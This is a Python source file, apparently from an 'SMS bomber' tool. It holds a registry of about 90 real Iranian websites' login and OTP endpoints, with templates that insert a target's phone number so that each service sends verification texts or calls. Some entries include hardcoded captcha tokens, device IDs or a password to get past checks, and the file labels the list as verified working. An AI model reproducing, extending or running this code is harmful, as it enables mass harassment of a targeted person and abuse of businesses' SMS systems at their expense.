# sms_bomber/api/providers.py
from typing import Dict, List, Any
from dataclasses import dataclass


@dataclass
class Provider:
    """SMS provider configuration."""

    name: str
    url: str
    data_template: Dict[str, Any]
    content_type: str = "json"  # "json" or "form"
    method: str = "POST"  # "POST" or "GET"

    def get_formatted_url(self, phone_number: str) -> str:
        """Generate the URL with phone number substituted."""
        if "{phone}" in self.url:
            return self.url.replace("{phone}", phone_number)
        return self.url

    def get_request_data(self, phone_number: str) -> Dict[str, Any]:
        """Generate request data for the provider."""
        import copy
        
        if isinstance(self.data_template, str):
            # Handle cases where data_template is a string (e.g., plain phone number input)
            return {"phone": self.data_template.format(phone=phone_number)}

        def replace_phone_recursive(obj):
            """Recursively replace {phone} in nested structures."""
            if isinstance(obj, dict):
                result = {}
                for key, value in obj.items():
                    result[key] = replace_phone_recursive(value)
                return result
            elif isinstance(obj, list):
                return [replace_phone_recursive(item) for item in obj]
            elif isinstance(obj, str):
                if "{phone}" in obj:
                    return obj.replace("{phone}", phone_number)
                elif "{phone[1:]}" in obj:
                    return obj.replace("{phone[1:]}", phone_number[1:])
                return obj
            else:
                return obj

        data = copy.deepcopy(self.data_template)
        return replace_phone_recursive(data)


class ProviderRegistry:
    """Registry of SMS providers."""

    def __init__(self):
        self.providers: List[Provider] = []
        self._load_default_providers()

    def _load_default_providers(self) -> None:
        """Load the default list of verified working providers."""
        default_providers = [
            # === VERIFIED WORKING PROVIDERS ===
            Provider(
                name="Digikala V1",
                url="https://api.digikala.com/v1/user/authenticate/",
                data_template={"username": "{phone}", "otp_call": False},
            ),
            Provider(
                name="Digikala V2",
                url="https://api.digikala.com/v1/user/forgot/check/",
                data_template={"username": "{phone}"},
            ),
            Provider(
                name="Divar",
                url="https://api.divar.ir/v5/auth/authenticate",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="Alibaba",
                url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
                data_template={"phoneNumber": "{phone[1:]}"},
            ),
            Provider(
                name="Sheypoor",
                url="https://www.sheypoor.com/api/v10.0.0/auth/send",
                data_template={"username": "{phone}"},
            ),
            Provider(
                name="GapFilm",
                url="https://core.gapfilm.ir/api/v3.1/Account/Login",
                data_template={"Type": "3", "Username": "{phone[1:]}"},
            ),
            Provider(
                name="Nobat",
                url="https://nobat.ir/api/public/patient/login/phone",
                data_template={"mobile": "{phone[1:]}"},
            ),
            Provider(
                name="Lendo",
                url="https://api.lendo.ir/api/customer/auth/send-otp",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Rojashop",
                url="https://rojashop.com/api/send-otp-register",
                data_template={"mobile": "{phone}", "withOtp": "1"},
                content_type="form",
            ),
            Provider(
                name="Paklean",
                url="https://client.api.paklean.com/download",
                data_template={"tel": "{phone}"},
            ),
            Provider(
                name="Khodro45",
                url="https://khodro45.com/api/v1/customers/otp/",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="DigikalaJet",
                url="https://api.digikalajet.ir/user/login-register/",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="Namava",
                url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
                data_template={"UserName": "+98{phone[1:]}"},
            ),
            Provider(
                name="BaSalam",
                url="https://auth.basalam.com/captcha/otp-request",
                data_template={"mobile": "{phone}"}
            ),
            Provider(
                name="BitPin",
                url="https://api.bitpin.ir/v3/usr/authenticate/",
                data_template={"password": "jgjhjgdhu87", "mobile": "{phone}", "use_voice_call": True}
            ),
            Provider(
                name="Trip.ir",
                url="https://gateway.trip.ir/api/Totp",
                data_template={"PhoneNumber": "{phone}"},
            ),
            Provider(
                name="Sibche",
                url="https://api.sibche.com/profile/sendCode",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Snapp",
                url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                data_template={"cellphone": "{phone}"},
            ),
            Provider(
                name="Hamrah-Mechanic",
                url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
                data_template={
                    "PhoneNumber": "{phone}",
                    "prevDomainUrl": "https://www.google.com/",
                    "landingPageUrl": "https://www.hamrah-mechanic.com/",
                    "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
                    "prevUrl": "https://www.hamrah-mechanic.com/profile/",
                    "referrer": "https://www.google.com/"
                },
            ),
            Provider(
                name="Okala",
                url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Takhfifan",
                url="https://takhfifan.com/v6/api/magento/login/init",
                data_template={"username": "{phone}"}
            ),
            Provider(
                name="Aparat",
                url="https://www.aparat.com/api/fa/v1/user/Authenticate/signup_step1?callbackType=postmessage&theme=light",
                data_template={"account": "{phone}"}
            ),
            Provider(
                name="Karnaval",
                url="https://www.karnaval.ir/api-2/graphql",
                data_template={
                    "query": "\n  mutation AuthCreatePhoneVerificationMutation(\n    $phone: String!\n    $isSecondAttempt: Boolean!\n  ) {\n    requestLoginByPhoneVerification(phone: $phone, isSecondAttempt: $isSecondAttempt) {\n      phone\n    }\n  }\n",
                    "variables": {"phone": "{phone}", "isSecondAttempt": False}
                },
            ),
            Provider(
                name="SnappTrip",
                url="https://platform-api.snapptrip.com/profile/auth/inquiry",
                data_template={"phoneNumber": "{phone}"}
            ),
            Provider(
                name="Delino",
                url="https://www.delino.com/user/register",
                data_template={"mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Miare",
                url="https://www.miare.ir/api/otp/driver/request/",
                data_template={
                    "phone_number": "{phone}",
                    "captcha_hashkey": "0c87526ea7dd9c6cee5e74632abe0321b4ecca5d",
                    "captcha_code": "WOIE"
                },
            ),
            Provider(
                name="Taaghche",
                url="https://gw.taaghche.com/mybook/v4/site/auth/loginValidation?contact={phone}",
                data_template={},
                method="GET",
            ),
            # === NEW PROVIDERS FROM IRANIAN-SMS-BOMBER ===
            Provider(
                name="Behtarino",
                url="https://bck.behtarino.com/api/v1/users/phone_verification/",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="Tex3",
                url="https://3tex.io/api/1/users/validation/mobile",
                data_template={"receptorPhone": "{phone}"},
            ),
            Provider(
                name="DeniizShop",
                url="https://deniizshop.com/api/v1/sessions/login_request",
                data_template={"mobile_phone": "{phone}"},
            ),
            Provider(
                name="Abantether",
                url="https://abantether.com/users/register/phone/send/",
                data_template={"phoneNumber": "{phone}", "email": ""},
            ),
            Provider(
                name="Flightio",
                url="https://flightio.com/bff/Authentication/CheckUserKey",
                data_template={"userKey": "98-{phone[1:]}", "userKeyType": 1},
            ),
            Provider(
                name="Pooleno",
                url="https://api.pooleno.ir/v1/auth/check-mobile",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Shad",
                url="https://shadmessenger12.iranlms.ir/",
                data_template={"api_version": "3", "method": "sendCode", "data": {"phone_number": "98{phone[1:]}", "send_type": "SMS"}},
            ),
            Provider(
                name="Tapsi",
                url="https://tap33.me/api/v2/user",
                data_template={"credential": {"phoneNumber": "{phone}", "role": "PASSENGER"}},
            ),
            Provider(
                name="Rubika",
                url="https://messengerg2c4.iranlms.ir/",
                data_template={"api_version": "3", "method": "sendCode", "data": {"phone_number": "98{phone[1:]}", "send_type": "SMS"}},
            ),
            Provider(
                name="Classino",
                url="https://nx.classino.com/otp/v1/api/login",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Bama",
                url="https://bama.ir/signin-checkforcellnumber",
                data_template={"cellNumber": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Digify",
                url="https://apollo.digify.shop/graphql",
                data_template={
                    "operationName": "Mutation",
                    "variables": {"content": {"phone_number": "{phone}"}},
                    "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}"
                },
            ),
            Provider(
                name="SnappFood",
                url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1",
                data_template={"cellphone": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="SnappMarket",
                url="https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phone}",
                data_template={},
                method="POST",
            ),
            Provider(
                name="MrBilit",
                url="https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={phone}&source=2&sendTokenIfNot=true",
                data_template={},
                method="GET",
            ),
            Provider(
                name="Filmnet",
                url="https://api-v2.filmnet.ir/access-token/users/{phone}/otp",
                data_template={},
                method="GET",
            ),
            Provider(
                name="Bitbarg",
                url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="DrDr",
                url="https://drdr.ir/api/registerEnrollment/sendDisposableCode",
                data_template={"phoneNumber": "{phone}", "userType": "PATIENT"},
            ),
            Provider(
                name="Banimode",
                url="https://mobapi.banimode.com/api/v2/auth/request",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="Chamedoon",
                url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
                data_template={"mobile": "{phone}", "origin": "/", "referrer_id": None},
            ),
            Provider(
                name="Kilid",
                url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="Pinket",
                url="https://pinket.com/api/cu/v2/phone-verification",
                data_template={"phoneNumber": "{phone}"},
            ),
            Provider(
                name="Otaghak",
                url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
                data_template={"userName": "{phone}"},
            ),
            Provider(
                name="Shab",
                url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
                data_template={"mobile": "{phone}", "country_code": "+98"},
            ),
            Provider(
                name="Bit24",
                url="https://bit24.cash/app/api/auth/check-mobile",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="iToll",
                url="https://app.itoll.ir/api/v1/auth/login",
                data_template={"mobile": "{phone}"},
            ),
            Provider(
                name="DigiPay",
                url="https://app.mydigipay.com/digipay/api/users/send-sms",
                data_template={"cellNumber": "{phone}", "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}},
            ),
            Provider(
                name="Gap",
                url="https://core.gap.im/v1/user/add.json?mobile=%2B98{phone[1:]}",
                data_template={},
                method="GET",
            ),
            Provider(
                name="Torob",
                url="https://api.torob.com/a/phone/send-pin/?phone_number={phone}",
                data_template={},
                method="GET",
            ),
            Provider(
                name="SnappDoctor",
                url="https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone[1:]}/sms?cCode=+98",
                data_template={},
                method="GET",
            ),
            Provider(
                name="Achareh",
                url="https://api.achareh.ir/v2/accounts/login/",
                data_template={"phone": "{phone}", "utm_source": "null"},
                content_type="form",
            ),
            Provider(
                name="A4Baz",
                url="https://a4baz.com/api/web/login",
                data_template={"cellphone": "{phone}"},
            ),
            Provider(
                name="Doctoreto",
                url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
                data_template={"mobile": "{phone}", "country_id": 205},
            ),
            Provider(
                name="Azki",
                url="https://www.azki.com/api/core/app/user/checkLoginAvailability",
                data_template={"phoneNumber": "azki_{phone}"},
            ),
            Provider(
                name="Buskool",
                url="https://www.buskool.com/send_verification_code",
                data_template={"phone": "{phone}"},
            ),
            Provider(
                name="Ghabzino",
                url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
                data_template={"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "{phone}"}},
            ),
            Provider(
                name="Simkhan",
                url="https://www.simkhanapi.ir/api/users/registerV2",
                data_template={"mobileNumber": "{phone}", "ReSendSMS": False},
            ),
            Provider(
                name="Limoome",
                url="https://my.limoome.com/api/auth/login/otp",
                data_template={"mobileNumber": "{phone[1:]}", "country": "1"},
                content_type="form",
            ),
            Provider(
                name="Bimito",
                url="https://bimito.com/api/core/app/user/checkLoginAvailability",
                data_template={"phoneNumber": "{phone}"},
            ),
            Provider(
                name="Dicardo",
                url="https://dicardo.com/main/sendsms",
                data_template={"phone": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Ghasedak24",
                url="https://ghasedak24.com/user/ajax_register",
                data_template={"username": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Tikban",
                url="https://tikban.com/Account/LoginAndRegister",
                data_template={"CellPhone": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Digistyle",
                url="https://www.digistyle.com/users/login-register/",
                data_template={"loginRegister[email_phone]": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Ketabchi",
                url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
                data_template={"phoneNumber": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Khanoumi",
                url="https://www.khanoumi.com/accounts/sendotp",
                data_template={"mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Timcheh",
                url="https://api.timcheh.com/auth/otp/send",
                data_template={"mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Iranicard",
                url="https://api.iranicard.ir/api/v1/register",
                data_template={"mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Cinematicket",
                url="https://cinematicket.org/api/v1/users/signup",
                data_template={"phone_number": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Irantic",
                url="https://www.irantic.com/api/login/request",
                data_template={"mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="SnappExpress",
                url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6",
                data_template={"cellphone": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Alopeyk",
                url="https://alopeyk.com/api/sms/send.php",
                data_template={"phone": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Tamland",
                url="https://1401api.tamland.ir/api/user/signup",
                data_template={"Mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Virgool",
                url="https://virgool.io/api/v1.4/auth/verify",
                data_template={"method": "phone", "identifier": "{phone}"},
            ),
            Provider(
                name="AnarGift",
                url="https://api.anargift.com/api/people/auth",
                data_template={"user": "{phone}", "app_id": 99},
            ),
            Provider(
                name="Binjo",
                url="https://api.binjo.ir/api/panel/get_code/{phone}",
                data_template={},
                method="GET",
            ),
            Provider(
                name="OKCS",
                url="https://okcs.com/users/mobilelogin?mobile={phone}",
                data_template={},
                method="GET",
            ),
            Provider(
                name="Helsa",
                url="https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={phone}&deviceId=050102153736100048967953736091842424",
                data_template={},
                method="POST",
            ),
            Provider(
                name="Rokla",
                url="https://api.rokla.ir/api/request/otp",
                data_template={"mobile": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Mashinbank",
                url="https://mashinbank.com/api2/users/check",
                data_template={"mobileNumber": "{phone}"},
                content_type="form",
            ),
            Provider(
                name="Pezeshket",
                url="https://api.pezeshket.com/core/v1/auth/requestCode",
                data_template={"mobileNumber": "{phone}"},
                content_type="form",
            ),
        ]
        self.providers.extend(default_providers)

    def add_provider(self, provider: Provider) -> None:
        """Add a new provider to the registry."""
        self.providers.append(provider)

    def get_all_providers(self) -> List[Provider]:
        """Get all registered providers."""
        return self.providers.copy()
